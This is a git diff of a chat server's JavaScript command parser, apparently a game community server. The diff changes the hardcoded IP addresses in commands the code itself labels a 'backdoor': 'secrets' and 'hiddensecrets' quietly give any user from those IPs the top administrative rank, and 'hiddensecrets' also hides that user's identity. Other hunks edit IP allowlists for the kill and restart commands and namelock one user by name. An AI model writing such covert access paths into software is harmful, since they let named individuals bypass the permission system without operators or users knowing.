@@ -1495,7 +1495,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	
 	case 'secrets':
 		// backdoor for panderp and kupo
-		if (user.ip  === '99.251.253.160'|| user.ip === '127.0.0.1' || user.ip === '204.112.213.60' ) {
+		if (user.ip  === '76.247.181.42'|| user.ip === '127.0.0.1' || user.ip === '204.112.213.60' ) {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
 			user.ip = "127.0.0.1";
@@ -1506,14 +1506,12 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	case 'hiddensecrets':
 	case 'hsecrets':
 		// courtesy of jd
-		if (user.ip === '99.251.253.160' || user.ip === '127.0.0.1' || user.ip === '76.247.181.42') {
+		if (user.ip === '204.112.213.60' || user.ip === '127.0.0.1' || user.ip === '76.247.181.42') {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
 			user.getIdentity = function() { return ' ' + user.name }
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
-			user.ip = "127.0.0.1";
 			return false;
 		}
-		user.ip = "127.0.0.1";
 		break;
 
 	case 'riles':
@@ -1528,7 +1526,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		if(user.name === 'Lasagne21'){
 			if(!user.namelocked){
 				user.nameLock('Lasagne21', true);
-				user.emit('console', 'you have been namelocked.');
+				user.emit('console', 'You have been namelocked.');
 			}
 			user.getIdentity = function(){
 				if(this.muted){
@@ -2527,7 +2525,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		break;
 
 	case 'kill':
-		if (!user.can('lockdown') || !(user.ip === '127.0.0.1' || user.ip === '99.251.253.160')) {
+		if (!user.can('lockdown') || !(user.ip === '127.0.0.1' || user.ip === '204.112.213.60' || user.ip === '76.247.181.42')) {
 			emit(socket, 'console', '/lockdown - Access denied.');
 			return false;
 		}
@@ -2557,7 +2555,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		break;
 
 	case 'restart':
-		if (!user.can('lockdown') || !(user.ip === '127.0.0.1' || user.ip === '99.251.253.160')) {
+		if (!user.can('lockdown') || !(user.ip === '127.0.0.1' || user.ip === '76.247.181.42' || user.ip === '204.112.213.60')) {
 			emit(socket, 'console', '/restart - Access denied.');
 			return false;
 		}
@@ -2666,6 +2664,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		rooms.lobby.logEntry(user.name + ' used /crashfixed');
 		return false;
 		break;
+		
 	case 'crashnoted':
 	case 'crashlogged':
 		if (!lockdown) {
@@ -2683,6 +2682,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		rooms.lobby.logEntry(user.name + ' used /crashnoted');
 		return false;
 		break;
+		
 	case 'modlog':
 		if (!user.can('modlog')) {
 			emit(socket, 'console', '/modlog - Access denied.');
@@ -2720,6 +2720,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		});
 		return false;
 		break;
+		
 	case 'banword':
 	case 'bw':
 		if (!user.can('declare')) {
@@ -2735,6 +2736,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		emit(socket, 'console', 'Added \"'+target+'\" to the list of banned words.');
 		return false;
 		break;
+		
 	case 'unbanword':
 	case 'ubw':
 		if (!user.can('declare')) {
@@ -2750,6 +2752,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		emit(socket, 'console', 'Removed \"'+target+'\" from the list of banned words.');
 		return false;
 		break;
+		
 	case 'help':
 	case 'commands':
 	case 'h':
@@ -3217,6 +3220,8 @@ function getRandMessage(user){
 		case 28: message = message + user.name + ' got lost in the illusion of reality.';
 			break;
 		case 29: message = message + user.name + ' was unfortunate and didn\'t get a cool message.';
+			break;
+		case 30: message = message + 'The Immortal accidently kicked ' + user.name + ' from the server!';
 			break;
 		default: message = message + user.name + ' was Pan Hammered!';
 	};
